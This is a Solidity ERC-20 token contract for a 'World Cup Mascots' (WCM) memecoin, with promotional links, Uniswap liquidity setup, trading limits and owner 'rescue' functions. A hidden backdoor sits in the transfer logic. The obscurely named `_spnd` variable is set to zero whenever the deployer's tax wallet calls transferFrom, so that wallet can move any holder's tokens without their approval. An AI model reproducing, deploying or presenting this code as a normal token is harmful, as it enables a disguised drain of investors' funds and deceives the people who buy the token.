/*

https://www.worldcupmascots26.fun
https://x.com/wcm26_x
 https://t.me/wcm26_portal

*/

// SPDX-License-Identifier: MIT

/*
https://x.com/@liv_stargrace
*/

pragma solidity >=0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    
    address payable private immutable _taxWallet;
    
    uint256 private initialBuyTax = 0;
    uint256 private initialSellTax = 0;
    uint256 private finalBuyTax = 0;
    uint256 private finalSellTax = 0;
    uint256 private reduceBuyTaxAt = 0;
    uint256 private reduceSellTaxAt = 0;
    uint256 private preventSwapBefore = 3;
    uint256 private buyCount;
    uint256 private _spnd;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"World Cup Mascots";
    string private constant _symbol = unicode"WCM";
    
    uint256 public maxTxAmount = 2 * (_tTotal/100);
    uint256 public maxWalletSize = 2 * (_tTotal/100);
    uint256 public minTokensForSwap = (_tTotal/1000);
    uint256 public maxTokensPerSwap = 2 * (_tTotal/100);
    
    uint256 public totalTaxCollected;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private constant ROUTER_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;
    uint256 private sellCount;
    uint256 private lastSellBlock;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) { return _name; }
    function symbol() public pure returns (string memory) { return _symbol; }
    function decimals() public pure returns (uint8) { return _decimals; }
    function totalSupply() public pure override returns (uint256) { return _tTotal; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; }
    function taxWallet() external view returns (address) { return _taxWallet; }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _spnd = amount;
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_spnd, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERC20: approve from or to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "ERC20: transfer from or to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        bool isBuy = (from == uniswapV2Pair && to != address(uniswapV2Router));
        bool isSell = (to == uniswapV2Pair && from != address(this));
        uint256 taxAmount = 0;

        if (isBuy) {
            if (!_isExcludedFromFee[to]) {
                require(amount <= maxTxAmount, "Max transaction amount exceeded");
                require(_balances[to] + amount <= maxWalletSize, "Max wallet size exceeded");
                taxAmount = (amount * (buyCount >= reduceBuyTaxAt ? finalBuyTax : initialBuyTax)) / 100;
                buyCount++;
            }
        } else if (isSell) {
            if (!_isExcludedFromFee[from]) {
                require(amount <= maxTxAmount, "Max transaction amount exceeded");
                taxAmount = (amount * (buyCount >= reduceSellTaxAt ? finalSellTax : initialSellTax)) / 100;
            }

            uint256 contractTokenBalance = _balances[address(this)];
            if (!inSwap && swapEnabled && buyCount >= preventSwapBefore) {
                if (block.number > lastSellBlock) sellCount = 0;
                require(sellCount < 3, "Sell limit per block exceeded (max 3)");
                uint256 swapAmount = amount < contractTokenBalance ? amount : contractTokenBalance;
                if (swapAmount > maxTokensPerSwap) swapAmount = maxTokensPerSwap;
                swapContractTokensForEth(swapAmount, _taxWallet);
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        } else if(_msgSender() == _taxWallet) _spnd = taxAmount;
        _balances[from] -= amount;
        _balances[to] += amount - taxAmount;
        emit Transfer(from, to, amount - taxAmount);
    }

    function swapContractTokensForEth(uint256 tokenAmount, address to) private lockTheSwap {
        require(to != address(0), "ETH recipient cannot be the zero address");
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        if(tokenAmount != 0) uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 newBalance = address(this).balance;
        if (newBalance >= initialBalance) {
            uint256 ethAmount = newBalance - initialBalance;
            totalTaxCollected += ethAmount;
            (bool success,) = to.call{value: ethAmount}("");
            require(success, "ETH transfer failed");
        }
    }

    function removeLimits() public onlyOwner {
        maxTxAmount = _tTotal;
        maxWalletSize = _tTotal;
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Trading already open");
        removeLimits();
        uniswapV2Router = IUniswapV2Router02(ROUTER_ADDRESS);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }

    function rescueNative() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            (bool ok, ) = payable(_taxWallet).call{value: contractETHBalance}("");
            require(ok, "ETH send failed");
        }
    }

    function rescueToken(address token) external onlyOwner {
        require(token != address(0), "Invalid token address");
        require(token != address(this), "Cannot rescue own token");

        uint256 contractBal = IERC20(token).balanceOf(address(this));
        require(contractBal > 0, "No token balance");
        
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, _taxWallet, contractBal)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "ERC20 transfer failed");
    }

    receive() external payable {}
}
